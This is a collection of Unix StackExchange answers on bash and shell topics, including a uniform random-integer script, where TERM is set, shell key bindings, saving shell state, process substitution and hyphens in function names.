<p>Before I go into any more detail about the whys and hows, here's the <strong><em>tl;dr</em></strong>: my shiny new script :-)</p>

<pre><code>#!/usr/bin/env bash
#
# Generates a random integer in a given range

# computes the ceiling of log2
# i.e., for parameter x returns the lowest integer l such that 2**l &gt;= x
log2() {
  local x=$1 n=1 l=0
  while (( x&gt;n &amp;&amp; n&gt;0 ))
  do
    let n*=2 l++
  done
  echo $l
}

# uses $RANDOM to generate an n-bit random bitstring uniformly at random
#  (if we assume $RANDOM is uniformly distributed)
# takes the length n of the bitstring as parameter, n can be up to 60 bits
get_n_rand_bits() {
  local n=$1 rnd=$RANDOM rnd_bitlen=15
  while (( rnd_bitlen &lt; n ))
  do
    rnd=$(( rnd&lt;&lt;15|$RANDOM ))
    let rnd_bitlen+=15
  done
  echo $(( rnd&gt;&gt;(rnd_bitlen-n) ))
}

# alternative implementation of get_n_rand_bits:
# uses /dev/urandom to generate an n-bit random bitstring uniformly at random
#  (if we assume /dev/urandom is uniformly distributed)
# takes the length n of the bitstring as parameter, n can be up to 56 bits
get_n_rand_bits_alt() {
  local n=$1
  local nb_bytes=$(( (n+7)/8 ))
  local rnd=$(od --read-bytes=$nb_bytes --address-radix=n --format=uL /dev/urandom | tr --delete "" "")
  echo $(( rnd&gt;&gt;(nb_bytes*8-n) ))
}

# for parameter max, generates an integer in the range {0..max} uniformly at random
# max can be an arbitrary integer, needs not be a power of 2
rand() {
  local rnd max=$1
  # get number of bits needed to represent $max
  local bitlen=$(log2 $((max+1)))
  while
    # could use get_n_rand_bits_alt instead if /dev/urandom is preferred over $RANDOM
    rnd=$(get_n_rand_bits $bitlen)
    (( rnd &gt; max ))
  do :
  done
  echo $rnd
}

# MAIN SCRIPT

# check number of parameters
if (( $# != 1 &amp;&amp; $# != 2 ))
then
  cat &lt;&lt;EOF 1&gt;&amp;2
Usage: $(basename $0) [min] max

Returns an integer distributed uniformly at random in the range {min..max}
min defaults to 0
(max - min) can be up to 2**60-1  
EOF
  exit 1
fi

# If we have one parameter, set min to 0 and max to $1
# If we have two parameters, set min to $1 and max to $2
max=0
while (( $# &gt; 0 ))
do
  min=$max
  max=$1
  shift
done

# ensure that min &lt;= max
if (( min &gt; max ))
then
  echo ""$(basename $0): error: min is greater than max"" 1&gt;&amp;2
  exit 1
fi

# need absolute value of diff since min (and also max) may be negative
diff=$((max-min)) &amp;&amp; diff=${diff#-}

echo $(( $(rand $diff) + min ))
</code></pre>

<p>Save that to <code>~/bin/rand</code> and you have at your availability a sweet random function in bash that can sample an integer in a given arbitrary range. The range may contain negative and positive integers and can be up to 2<sup>60</sup>-1 in length:</p>

<pre><code>$ rand 
Usage: rand [min] max

Returns an integer distributed uniformly at random in the range {min..max}
min defaults to 0
(max - min) can be up to 2**60-1  
$ rand 1 10
9
$ rand -43543 -124
-15757
$ rand -3 3
1
$ for i in {0..9}; do rand $((2**60-1)); done
777148045699177620
456074454250332606
95080022501817128
993412753202315192
527158971491831964
336543936737015986
1034537273675883580
127413814010621078
758532158881427336
924637728863691573
</code></pre>

<p>All ideas by the other answerers were great. The answers by <a href=""https://unix.stackexchange.com/a/157259"">terdon</a>, <a href=""https://unix.stackexchange.com/a/157321"">J.F. Sebastian</a>, and <a href=""https://unix.stackexchange.com/a/157267"">jimmij</a> used external tools to do the task in a simple and efficient manner. However, I preferred a true bash solution for maximum portability, and maybe a little bit, simply out of love for bash ;)</p>

<p><a href=""https://unix.stackexchange.com/a/157266"">Ramesh</a>'s and <a href=""https://unix.stackexchange.com/a/157263"">l0b0</a>'s answers used <code>/dev/urandom</code> or <code>/dev/random</code> in combination with <code>od</code>. That's good, however, their approaches had the disadvantage of only being able to sample random integers in the range 0 to 2<sup>8n</sup>-1 for some n, since this method samples bytes, i.e., bitstrings of length 8. These are quite big jumps with increasing n.</p>

<p>Finally, <a href=""https://unix.stackexchange.com/a/157274"">Falco</a>'s answer describes the general idea how this could be done for <em>arbitrary</em> ranges (not only powers of two). Basically, for a given range <code>{0..max}</code>, we can determine what the next power of two is, i.e., exactly how many <em>bits</em> are required to represent <code>max</code> as a bitstring. Then we can sample just that many bits and see whether this bistring, as an integer, is greater than <code>max</code>. If so, repeat. Since we sample just as many bits as are required to represent <code>max</code>, each iteration has a probability greater or equal than 50% of succeeding (50% in the worst case, 100% in the best case). So this is very efficient.</p>

<p>My script is basically a concrete implementation of Falco's answer, written in pure bash and highly efficient since it uses bash's built-in bitwise operations to sample bitstrings of the desired length. It additionally honors an idea by <a href=""https://askubuntu.com/questions/525599/how-to-display-a-random-line-from-a-text-file/525624#comment719930_525624"">Eliah Kagan</a> that suggests to use the built-in <code>$RANDOM</code> variable by concatening bitstrings resulting from repeated invocations of <code>$RANDOM</code>. I actually implemented both the possibilities to use <code>/dev/urandom</code> and <code>$RANDOM</code>. By default the above script uses <code>$RANDOM</code>. (And ok, if using <code>/dev/urandom</code> we need <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/od.html"" rel=""nofollow noreferrer"">od</a> and <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/tr.html"" rel=""nofollow noreferrer"">tr</a>, but these are backed by POSIX.)</p>

<h1>So how does it work?</h1>

<p>Before I get into this, two observations:</p>

<ol>
<li><p>It turns out bash can't handle integers larger than 2<sup>63</sup>-1. See for yourself:</p>

<pre><code>$ echo $((2**63-1))
9223372036854775807
$ echo $((2**63))
-9223372036854775808
</code></pre>

<p>It would appear that bash internally uses signed 64-bit integers to store integers. So, at 2<sup>63</sup> it ""wraps around"" and we get a negative integer. So we can't hope to get any range larger than 2<sup>63</sup>-1 with whatever random function we use. Bash simply can't handle it.</p></li>
<li><p>Whenever we want to sample a value in an arbitrary range between <code>min</code> and <code>max</code> with possibly <code>min != 0</code>, we can simply sample a value between <code>0</code> and <code>max-min</code> instead and then add <code>min</code> to the final result. This works even if <code>min</code> and possibly also <code>max</code> are <em>negative</em>, but we need to be careful to sample a value between <code>0</code> and <em>the absolute value of</em> <code>max-min</code>. So then, we can focus on how to sample a random value between <code>0</code> and an arbitrary positive integer <code>max</code>. The rest is easy.</p></li>
</ol>

<p><strong>Step 1: Determine how many bits are needed to represent an integer (the logarithm)</strong></p>

<p>So for a given value <code>max</code>, we want to know just how many bits are needed to represent it as a bitstring. This is so that later we can randomly sample only just as many bits as are needed, which makes the script so efficient.</p>

<p>Let's see. Since with <code>n</code> bits, we can represent up to the value 2<sup>n</sup>-1, then the number <code>n</code> of bits needed to represent an arbitrary value <code>x</code> is ceiling(log<sub>2</sub>(x+1)). So, we need a function to compute the ceiling of a logarithm to the base 2. It is rather self-explanatory:</p>

<pre><code>log2() {
  local x=$1 n=1 l=0
  while (( x&gt;n &amp;&amp; n&gt;0 ))
  do
    let n*=2 l++
  done
  echo $l
}
</code></pre>

<p>We need the condition <code>n&gt;0</code> so if it grows too great, wraps around and becomes negative, the loop is guaranteed to terminate.</p>

<p><strong>Step 2: Sample a random a bitstring of length <code>n</code></strong></p>

<p>The most portable ideas are to either use <code>/dev/urandom</code> (or even <code>/dev/random</code> if there is a strong reason) or bash's built-in <code>$RANDOM</code> variable. Let's look at how to do it with <code>$RANDOM</code> first.</p>

<p><em>Option A: Using <code>$RANDOM</code></em></p>

<p>This uses the <a href=""https://askubuntu.com/questions/525599/how-to-display-a-random-line-from-a-text-file/525624#comment719930_525624"">idea</a> mentioned by Eliah Kagan. Basically, since <code>$RANDOM</code> samples a 15-bit integer, we can use <code>$((RANDOM&lt;&lt;15|RANDOM))</code> to sample a 30-bit integer. That means, shift a first invocation of <code>$RANDOM</code> by 15 bits to the left, and apply a bitwise or with a second invocation of <code>$RANDOM</code>, effectively concatening two independently sampled bitstrings (or at least as independent as bash's built-in <code>$RANDOM</code> goes).</p>

<p>We can repeat this to obtain a 45-bit or 60-bit integer. After that bash can't handle it anymore, but this means we can easily sample a random value between 0 and 2<sup>60</sup>-1. So, to sample an n-bit integer, we repeat the procedure until our random bitstring, whose length grows in 15-bit steps, has a length greater or equal than n. Finally, we cut off the bits that are too much by appropriately bitwise shifting to the right, and we end up with a n-bit random integer.</p>

<pre><code>get_n_rand_bits() {
  local n=$1 rnd=$RANDOM rnd_bitlen=15
  while (( rnd_bitlen &lt; n ))
  do
    rnd=$(( rnd&lt;&lt;15|$RANDOM ))
    let rnd_bitlen+=15
  done
  echo $(( rnd&gt;&gt;(rnd_bitlen-n) ))
}
</code></pre>

<p><em>Option B: Using <code>/dev/urandom</code></em></p>

<p>Alternatively, we can use <code>od</code> and <code>/dev/urandom</code> to sample an n-bit integer. <code>od</code> will read bytes, i.e., bitstrings of length 8. Similarly as in the previous method, we sample just so many bytes that the equivalent number of sampled <em>bits</em> is greater or equal than n, and cut off the bits that are too much.</p>

<p>The lowest number of bytes needed to get at least n bits is the lowest multiple of 8 that is greater or equal than n, i.e., floor((n+7)/8).</p>

<p>This only works up to 56-bit integers. Sampling one more byte would get us an 64-bit integer, i.e., a value up to 2<sup>64</sup>-1, which bash can't handle.</p>

<pre><code>get_n_rand_bits_alt() {
  local n=$1
  local nb_bytes=$(( (n+7)/8 ))
  local rnd=$(od --read-bytes=$nb_bytes --address-radix=n --format=uL /dev/urandom | tr --delete "" "")
  echo $(( rnd&gt;&gt;(nb_bytes*8-n) ))
}
</code></pre>

<p><strong>Putting the pieces together: Get random integers in <em>arbitrary</em> ranges</strong></p>

<p>We can sample <code>n</code>-bit bitstrings now, but we want to sample integers in a range from <code>0</code> to <code>max</code>, <em>uniformly at random</em>, where <code>max</code> may be arbitrary, not necessarily a power of two. (We can't use modulo as that creates a bias.)</p>

<p>The whole point why we tried so hard to sample just as many bits as are needed to represent the value <code>max</code>, is that we can now safely (and efficiently) use a loop to repeatedly sample an <code>n</code>-bit bitstring until we sample a value that is lower or equal to <code>max</code>. In the worst case (<code>max</code> is a power of two), each iteration terminates with a probability of 50%, and in the best case (<code>max</code> is a power of two minus one), the first iteration terminates with certainty.</p>

<pre><code>rand() {
  local rnd max=$1
  # get number of bits needed to represent $max
  local bitlen=$(log2 $((max+1)))
  while
    # could use get_n_rand_bits_alt instead if /dev/urandom is preferred over $RANDOM
    rnd=$(get_n_rand_bits $bitlen)
    (( rnd &gt; max ))
  do :
  done
  echo $rnd
}
</code></pre>

<p><strong>Wrapping things up</strong></p>

<p>Finally, we want to sample integers between <code>min</code> and <code>max</code>, where <code>min</code> and <code>max</code> can be arbitrary, even negative. As previously mentioned, this is now trivial.</p>

<p>Let's put it all in a bash script. Do some argument parsing stuff... We want two arguments <code>min</code> and <code>max</code>, or only one argument <code>max</code>, where <code>min</code> defaults to <code>0</code>.</p>

<pre><code># check number of parameters
if (( $# != 1 &amp;&amp; $# != 2 ))
then
  cat &lt;&lt;EOF 1&gt;&amp;2
Usage: $(basename $0) [min] max

Returns an integer distributed uniformly at random in the range {min..max}
min defaults to 0
(max - min) can be up to 2**60-1  
EOF
  exit 1
fi

# If we have one parameter, set min to 0 and max to $1
# If we have two parameters, set min to $1 and max to $2
max=0
while (( $# &gt; 0 ))
do
  min=$max
  max=$1
  shift
done

# ensure that min &lt;= max
if (( min &gt; max ))
then
  echo ""$(basename $0): error: min is greater than max"" 1&gt;&amp;2
  exit 1
fi
</code></pre>

<p>...and, finally, to sample uniformly at random a value between <code>min</code> and <code>max</code>, we sample a random integer between <code>0</code> and the absolute value of <code>max-min</code>, and add <code>min</code> to the final result. :-)</p>

<pre><code>diff=$((max-min)) &amp;&amp; diff=${diff#-}

echo $(( $(rand $diff) + min ))
</code></pre>

<p>Inspired by <a href=""https://askubuntu.com/questions/525599/how-to-display-a-random-line-from-a-text-file/525624#comment721328_525624"">this</a>, I might try to use <a href=""http://manpages.ubuntu.com/manpages/trusty/man1/dieharder.1.html"" rel=""nofollow noreferrer"">dieharder</a> to test and benchmark this PRNG, and put my findings in here. :-)</p>
"
"Where does the TERM environment variable default get set?","198794","<bash><shell><terminal><environment-variables><colors>","32","<h1>In lots of places, depending</h1>

<p>On virtual terminals and real terminals, the <code>TERM</code> environment variable is set by the program that chains to <code>login</code>, and is inherited all of the way along to the interactive shell that executes once one has logged on.  Where, precisely, this happens varies from system to system, and according to the kind of terminal.</p>

<h2>real terminals</h2>

<p>Real, serial, terminals can vary in type, according to what's at the other end of the wire.  So conventionally the <code>getty</code> program is invoked with an argument that specifies the terminal type, or is passed the <code>TERM</code> program from a service manager's service configuration data.</p>

<ul>
<li>On van Smoorenburg <code>init</code> systems, one can see this in <code>/etc/inittab</code> entries, which will read something along the lines of </p><p><pre>S0:3:respawn:/sbin/agetty ttyS0 9600 vt100-nav</pre> The last argument to <code>agetty</code> in that line, <code>vt100-nav</code>, is the terminal type set for <code>/dev/ttyS0</code>.  So <code>/etc/inittab</code> is where to change the terminal type for real terminals on such systems.</li>
<li>On systemd systems, one used to be able to see this in the <code>/usr/lib/systemd/system/serial-getty@.service</code> unit file (<code>/lib/systemd/system/serial-getty@.service</code> on un-merged systems), which used to read </p><p><pre>Environment=TERM=vt100</pre> setting the <code>TERM</code> variable in the environment passed to <code>agetty</code>.</li>
<li>On the BSDs, <code>init</code> takes the terminal type from the third field of each terminal's entry in the <code>/etc/ttys</code> database, and sets <code>TERM</code> from that in the environment that it executes <code>getty</code> with.  So <code>/etc/ttys</code> is where one changes the terminal type for real terminals on the BSDs.</li>
</ul>

<h2>systemd's variability</h2>

<p>The <code>serial-getty@.service</code> service unit file, or drop-in files that apply thereto, is where to change the terminal type for real terminals on systemd systems.  Note that such a change applies to <em>all</em> terminal login services that employ this service unit template.  (To change it for only individual terminals, one has to manually instantiate the template, or add drop-ins that only apply to instantiations.)</p>

<p>systemd has had at least four mechanisms during its lifetime for picking up the value of the <code>TERM</code> environment variable.  At the time of first writing this answer, as can be seen, there was an <code>Environment=TERM=<i>something</i></code> line in the template service unit files.  At other times, the types <code>linux</code> and <code>vt102</code> were hard-wired into the <code>getty</code> and <code>serial-getty</code> service unit files respectively.  More recently, the environment variable has been inherited from process #1, which has set it in various ways.</p>

<p>As of 2020, the way that systemd decides what terminal type to specify in a service's <code>TERM</code> environment variable is quite complex, and not documented at all.  The way to change it remains a drop-in configuration file with <code>Environment=TERM=<i>something</i></code>.  But <em>where the default value originates from</em> is quite variable.  Subject to some fairly complex to explain rules that involve the <code>TTYPath=</code> settings of individual service units, <a href=""https://github.com/systemd/systemd/blob/693040bde5162c8af3d0f063414288eba5255b3c/src/core/execute.c#L1792"" rel=""nofollow noreferrer"">it can be one of three values</a>: a hardwired <code>linux</code>, a hardwired <code>vt220</code> (no longer <code>vt102</code>), or the value of the <code>TERM</code> environment variable that process #1 inherited, usually from the kernel/bootstrap loader.</p>

<p>(Ironically, the <code>getttyent()</code> mechanism still exists in the GNU C library, and systemd could have re-used the <code>/etc/ttys</code> mechanism.)</p>

<h2>kernel virtual terminals</h2>

<p>Kernel virtual terminals, as you have noted, have a fixed type.  Unlike NetBSD, which can vary the kernel virtual terminal type on the fly, Linux and the other BSDs have a single fixed terminal type implemented in the kernel's built-in terminal emulation program.  On Linux, that type matches <code>linux</code> from the terminfo database.  (FreeBSD's kernel terminal emulation since version 9 has been <code>teken</code>.  Prior to version 9 it was <code>cons25</code>  OpenBSD's is <code>pccon</code>.)</p>

<ul>
<li>On systems using <code>mingetty</code> or <code>vc-get-tty</code> (from the nosh package) the program ""knows"" that it can only be talking to a virtual terminal, and they hardwire the ""known"" virtual terminal types appropriate to the operating system that the program was compiled for.</li>
<li>On systemd systems, one used to be able to see this in the <code>/usr/lib/systemd/system/getty@.service</code> unit file (<code>/lib/systemd/system/getty@.service</code> on un-merged systems), which read </p><p><pre>Environment=TERM=linux</pre> setting the <code>TERM</code> variable in the environment passed to <code>agetty</code>.</li>
</ul>

<p>For kernel virtual terminals, one <em>does not</em> change the terminal type.  The terminal emulator program in the kernel doesn't change, after all.  It is <em>incorrect</em> to change the type.  In particular, this will screw up cursor/editing key CSI sequence recognition.  The <code>linux</code> CSI sequences sent by the Linux kernel terminal emulator are different to the <code>xterm</code> or <code>vt100</code> CSI sequences sent by GUI terminal emulator programs in DEC VT mode.  (In fact, they are highly idiosyncratic and non-standard, and different both to all real terminals that I know of, and to pretty much all other software terminal emulators apart from the one built into Linux.)</p>

<h2>GUI terminal emulators</h2>

<p>Your GUI terminal emulator is one of many programs, from the SSH d&aelig;mon to <code>screen</code>, that uses pseudo-terminals.  What the terminal type is depends from what terminal emulator program is running on the master side of the pseudo-terminal, and how it is configured.  Most GUI terminal emulators will start the program on the slave side with a <code>TERM</code> variable whose value matches their terminal emulation on the master side.  Programs like the SSH server will attempt to ""pass through"" the terminal type that is on the client end of the connection.  Usually there is some menu or configuration option to choose amongst terminal emulations.</p>

<h1>The gripping hand</h1>

<p>The right way to detect colour capability is <em>not</em> to hardwire a list of terminal types in your script.  There are an awful lot of terminal types that support colour.</p>

<p>The right way is to look at what termcap/terminfo says about your terminal type.<pre>colour=0
if tput Co &gt; /dev/null 2>&amp;1
then
    test ""`tput Co`"" -gt 2 &amp;&amp; colour=1
elif tput colors &gt; /dev/null 2>&amp;1
then
    test ""`tput colors`"" -gt 2 &amp;&amp; colour=1
fi</pre></p>

<h1>Further reading</h1>

<ul>
<li>Jonathan de Boyne Pollard (2018). <a href=""http://jdebp.eu./Softwares/nosh/guide/TERM.html"" rel=""nofollow noreferrer""><code>TERM</code></a>. <em>nosh Guide</em>. Softwares.</li>
</ul>
"
"ESC + { : What is it and where I can know more about it?","260125","<bash><command-line><keyboard-shortcuts><line-editor>","32","<p>To find out about a key binding.</p>

<h2>In <code>bash</code>:</h2>

<pre><code>$ bind -p | grep -a '{'
""\e{"": complete-into-braces
""{"": self-insert

$ LESS='+/complete-into-braces' man  bash
   complete-into-braces (M-{)
          Perform filename completion and insert the list of possible com‐
          pletions  enclosed within braces so the list is available to the
          shell (see Brace Expansion above).
</code></pre>

<p>Or with <code>info</code>:</p>

<pre><code>info bash --index-search=complete-into-braces
</code></pre>

<p>(or <code>info bash</code> and use the <em>index</em> with completion (<code>i</code> key))</p>

<p>However note that the pre-built info page that comes with bash-4.3 sources at least is missing some index entries including that for <code>complete-into-braces</code>, so unless your OS rebuilds the info page from the texinfo sources, the above command won't work.</p>

<h1>In <code>zsh</code></h1>

<pre><code>$ bindkey| grep W
""^W"" backward-kill-word
""^[W"" copy-region-as-kill
$ info --index-search=copy-region-as-kill zsh
copy-region-as-kill (ESC-W ESC-w) (unbound) (unbound)
 Copy the area from the cursor to the mark to the kill buffer.

 If called from a ZLE widget function in the form 'zle
 copy-region-as-kill STRING' then STRING will be taken as the text
 to copy to the kill buffer.  The cursor, the mark and the text on
 the command line are not used in this case.
</code></pre>

<p>Or with <code>man</code> assuming the <code>less</code> pager like for <code>bash</code>:</p>

<pre><code>LESS='+/copy-region-as-kill' man zshall
</code></pre>

<p><code>zsh</code> also has a <code>describe-key-briefly</code> which you can bind on a key or key sequence, like <kbd>Ctrl+X</kbd><kbd>Ctrl+H</kbd> below:</p>

<pre><code>bindkey '^X^H' describe-key-briefly
</code></pre>

<p>Then you type <kbd>Ctrl+X</kbd><kbd>Ctrl+H</kbd> followed by the key or key combination to describe. For instance, typing that <kbd>Ctrl+X</kbd><kbd>Ctrl+H</kbd> twice would display below the prompt:</p>

<pre><code>""^X^H"" is describe-key-briefly
</code></pre>

<h2>In <code>tcsh</code></h2>

<p>That's basically the same as <code>zsh</code> except that <code>tcsh</code> doesn't have an info page.</p>

<pre><code>&gt; bindkey | grep -a P
""^P""           -&gt;  up-history
""^[P""          -&gt; history-search-backward
&gt; env LESS=+/history-search-backward man tcsh
[...]
</code></pre>

<h2>In <code>fish</code>:</h2>

<pre><code>&gt; bind | grep -F '\ec'
bind \ec capitalize-word
&gt; help commands
</code></pre>

<p>Which should start your preferred web browser. And search for <code>capitalize-word</code> in there. </p>
"
"Bash autocomplete: first list files then cycle through them","55203","<bash><autocomplete>","32","<p>This seems close to what you want:</p>

<pre><code>bind ""TAB:menu-complete""
bind ""set show-all-if-ambiguous on""
</code></pre>
"
"How can I list bash'es options for the current shell?","210158","<bash><shopt>","32","<pre><code>printf %s\\n ""$-""
</code></pre>

<p>Will list the single letter options in a single string.</p>

<p>That parameter can also be used like:</p>

<pre><code>set -f -- ${-:+""-$-""}
echo *don\'t* *glob* *this*
set +f ""$@""
</code></pre>

<p>To first disable shell <code>-f</code>ilename expansion while simultaneously saving a value for <code>$-</code> - if any - in <code>$1</code>. Next, no globs occur, and last <code>+f</code>ilename expansion is once again enabled, and possibly also disabled.</p>

<p>For example, if <code>-f</code>ilename expansion was already disabled when the value for <code>$-</code> was first saved, then its saved value would be <em>(at least)</em>:</p>

<pre><code>f
</code></pre>

<p>And so when <code>set</code> is run again, it works out to:</p>

<pre><code>set +f -f
</code></pre>

<p>Which just puts you right back where you started.</p>

<pre><code>set +o
</code></pre>

<p>Will list all <code>set</code>table shell options <em>(see <a href=""https://unix.stackexchange.com/a/210160/52934"">Jason's answer</a> for the <code>shopt</code>able - is that a word? - options)</em> in a form that is safe for shell reentry.  In that way, you can also do:</p>

<pre><code>state=$(set +o)
set -some -crazy -options
eval ""$state""
</code></pre>

<p>To save, change, and restore the shell options' state respectively.</p>

<p>To handle <code>shopt</code>ions and <code>set</code>table options in one go:</p>

<pre><code>state=$(set +o;shopt)
#do what you want with options here
eval ""$state""
</code></pre>

<p>You can also call <code>set</code> <em>without</em> any arguments to add a list of all of the shell's currently set variables - also quoted for reentry to the shell. And you can - in bash - additionally add the command <code>typeset -fp</code> to also include all currently declared shell functions. You can lump it all together and <code>eval</code> when ready. You can even call <code>alias</code> without arguments for more of the same. That... might cover it, though. I guess there is <code>""$@""</code> - which you'd have to put in a <code>bash</code> array first, I suppose, before doing <code>set</code>. </p>

<p>Nope, there's also <code>trap</code>. This one's a little funny. Usually:</p>

<pre><code>trap 'echo this is my trap' 0
(echo this is my subshell; trap)
</code></pre>

<p>...will just print <em>this is my subshell</em> because the subshell is a new process and gets its own set of <code>trap</code>s - and so doesn't inherit any <code>trap</code>s but those which its parent has explicitly ignored - <em>(like <code>trap '' INT</code>)</em>.</p>

<p>However:</p>

<pre><code>trap 'echo this is my trap' 0
save_traps=$(trap)
</code></pre>

<p><code>trap</code> behaves specially when it is the first and <em>only</em> command run in a command substitution subshell in that it will reproduce a list of the parent shell's currently set <code>traps</code> in a format which is quoted for safe reentry to the shell. And so you can do the <code>save_traps</code>, <em>then</em> <code>set</code> without arguments - and all of the rest already mentioned - to pretty much get a lock on all shell state. You might want to explicitly add <code>export -p</code> and <code>readonly -p</code> to restore original shell var attributes, though. </p>

<p>Anyway, that's enough.</p>
"
"Escape a variable for use as content of another script","379181","<bash><variable><variable-substitution><bash-expansion>","32","<p>I guess I didn't RTFM. It can be done like so:</p>
<pre class=""lang-sh prettyprint-override""><code>q_mid=\'\\\'\'
foo_esc=&quot;'${foo//\'/$q_mid}'&quot;
</code></pre>
<p>Then <code>echo &quot;$foo_esc&quot;</code> gives the expected <code>'bar'\''baz'</code></p>
<hr />
<p>How I'm actually using it is with a function:</p>
<pre class=""lang-sh prettyprint-override""><code>function esc_var {
    local mid_q=\'\\\'\'
    printf '%s' &quot;'${1//\'/$mid_q}'&quot;
}

...

foo_esc=&quot;`esc_var &quot;$foo&quot;`&quot;
</code></pre>
<hr />
<p>Modifying this to use the <code>printf</code> built-in from Dejay's solution:</p>
<pre class=""lang-sh prettyprint-override""><code>function esc_vars {
    printf ' %q' &quot;$@&quot; | cut -b 2-
}
</code></pre>
"
"Terminal vs bash?","180943","<bash><shell><terminal>","32","<p>When you launch a terminal it will always run some program inside it. That program will generally by default be your shell. On OS X, the default shell is Bash. In combination that means that <strong>when you launch Terminal you get a terminal emulator window with <code>bash</code> running inside it</strong> (by default).</p>

<p>You can <a href=""http://support.apple.com/kb/ta27005"">change the default shell</a> to something else if you like, although OS X only ships with <code>bash</code> and <code>tcsh</code>. You can choose to launch a custom command in a new terminal with <a href=""https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/open.1.html"">the <code>open</code> command</a>:</p>

<pre><code>open -b com.apple.terminal somecommand
</code></pre>

<p>In that case, your shell <em>isn't</em> running in it, and when your custom command terminates that's the end of things.</p>

<p>If you run <code>bash</code> inside your terminal that is already running <code>bash</code>, you get exactly that: one shell running another. You can exit the inner shell with <kbd>Ctrl-D</kbd> or <code>exit</code> and you'll drop back to the shell you started in. That can sometimes be useful if you want to test out configuration changes or customise your environment temporarily — when you exit the inner shell, the changes you made go away with it. You can nest them arbitrarily deeply. If you're not doing that, there's no real point in launching another one, but a command like <code>bash some-script.sh</code> will run just that script and then exit, which is often useful.</p>

<hr>

<p>The differences between interactive and non-interactive shells are a bit subtle and mostly deal with which configuration files are loaded, which error behaviours there are, and whether aliases and similar are enabled. The rough principle is that an interactive shell gives you the settings you'd want for sitting in front of it, while a non-interactive shell gives you what you'd want for a standalone script. All of the differences are documented explicitly in the <a href=""https://www.gnu.org/software/bash/manual/html_node/Interactive-Shell-Behavior.html#Interactive-Shell-Behavior"">Bash Reference Manual</a>, and also in <a href=""https://unix.stackexchange.com/questions/43385/what-do-you-mean-by-interactive-shell"">a dedicated question on this site</a>.</p>

<p>For the most part, you don't need to care. There's not often a reason to launch another shell, and when you do you'll have a specific purpose in mind and know what to do with it.</p>
"
"Why does `sort <(ls -l)` work but `sort < (ls -l)` fail?","229022","<bash><process-substitution>","32","<p>Because that's not an <code>&lt;</code>, it's a <code>&lt;()</code> which is completely different. This is called <a href=""http://www.gnu.org/software/bash/manual/bash.html#Process-Substitution"">process substitution</a>, it is a feature of certain shells that allows you to use the output of one process as input for another. </p>

<p>The <code>&gt;</code> and <code>&lt;</code> operators redirect output to and input from <em>files</em>. The <code>&lt;()</code> operator deals with commands (processes), not files. When you run </p>

<pre><code>sort &lt; (ls)
</code></pre>

<p>You are attempting to run the command <code>ls</code> in a subshell (that's what the parentheses mean), then to pass that subshell as an input file to <code>sort</code>. This, however, is not accepted syntax and you get the error you saw. </p>
"
"How can I see the exact command line being executed inside some bash instance?","159010","<bash><process><debugging>","31","<p>I knew I was grasping at straws, but UNIX never fails!</p>

<p>Here's how I managed it:</p>

<pre><code>bash$ gdb --pid 8909
...
Loaded symbols for /lib/i386-linux-gnu/i686/cmov/libnss_files.so.2
0xb76e7424 in __kernel_vsyscall ()
</code></pre>

<p>Then at the <code>(gdb)</code> prompt I ran the command, <code>call write_history(""/tmp/foo"")</code> which will write this history to the file <code>/tmp/foo</code>.</p>

<pre><code>(gdb) call write_history(""/tmp/foo"")
$1 = 0
</code></pre>

<p>I then detach from the process.</p>

<pre><code>(gdb) detach
Detaching from program: /bin/bash, process 8909
</code></pre>

<p>And quit <code>gdb</code>.</p>

<pre><code>(gdb) q
</code></pre>

<p>And sure enough...</p>

<pre><code>bash$ tail -1 /tmp/foo
while true ; do echo 1 ; echo 2&gt;/dev/null ; sleep 30 ; done
</code></pre>

<p>For easy future re-use, I wrote a <a href=""https://github.com/ttsiodras/utils/blob/master/showBashCmdline.sh"">bash script</a>, automating the process.</p>
"
"Pipe to multiple files in the shell","97705","<bash><shell><grep><pipe>","31","<p>If you have <strong>tee</strong></p>

<pre class=""lang-bash prettyprint-override""><code>./app | tee &gt;(grep A &gt; A.out) &gt;(grep B &gt; B.out) &gt;(grep C &gt; C.out) &gt; /dev/null
</code></pre>

<p>(from <a href=""https://unix.stackexchange.com/a/28519/33933"">here</a>)</p>

<p>(<a href=""http://en.wikipedia.org/wiki/Process_substitution"" rel=""noreferrer"">about process substitution</a>)</p>
"
"Are there problems with hyphens in functions, aliases, and executables?","168221","<bash><shell><zsh><ksh><csh>","31","<h3>POSIX and Hyphens: No Guarantee</h3>

<p>According to the POSIX standard, <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_09_05"">a function name</a> must be a valid name and <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap03.html#tag_03_231"">a name</a> can consist of:</p>

<blockquote>
  <p><b>3.231 Name</b><br>
  In the shell command language, a word consisting solely of
  underscores, digits, and alphabetics from the portable character set.
  The first character of a name is not a digit.</p>
</blockquote>

<p>Additionally, <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_03_01"">an alias</a> must be a valid <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap03.html#tag_03_10"">alias name</a>, which can consist of:</p>

<blockquote>
  <p><b>3.10 Alias Name</b><br>
  In the shell command language, a word consisting solely of underscores,
  digits, and alphabetics from the portable character set and any of the
  following characters: '!', '%', ',', '@'.</p>
  
  <p><strong>Implementations may allow other characters within alias names as an
  extension.</strong> <em>(Emphasis mine.)</em></p>
</blockquote>

<p>A hyphen is <em>not</em> listed among the characters that must be allowed in either case. So, if they are used, portability is not guaranteed.</p>

<h3>Examples of Shells That Do Not Support Hyphens</h3>

<p><code>dash</code> is the default shell (<code>/bin/sh</code>) on the debian-ubuntu family and it does not support hyphens in function names:</p>

<pre><code>$ a-b() { date; }
dash: 1: Syntax error: Bad function name
</code></pre>

<p>Interestingly enough, it <em>does</em> support hyphens in aliases, though, as noted above, this is an <em>implementation characteristic</em>, not a requirement:</p>

<pre><code>$ a_b() { printf ""hello %s\n"" ""$1""; }
$ alias a-b='a_b'
$ a-b world
hello world
</code></pre>

<p>The busybox shell (Almquist shell) also does not support hyphens in function names:</p>

<pre><code>$ a-b() { date; }
-sh: Syntax error: Bad function name
</code></pre>

<h3>Summary of Hyphen Support by Shell</h3>

<p>The following shells are known to support hyphens in function names:</p>

<ul>
<li>ksh, bash, zsh</li>
</ul>

<p>The following shells are known <em>not</em> to support hyphens in function names:</p>

<ul>
<li>ash (busybox), csh, tcsh, dash</li>
</ul>

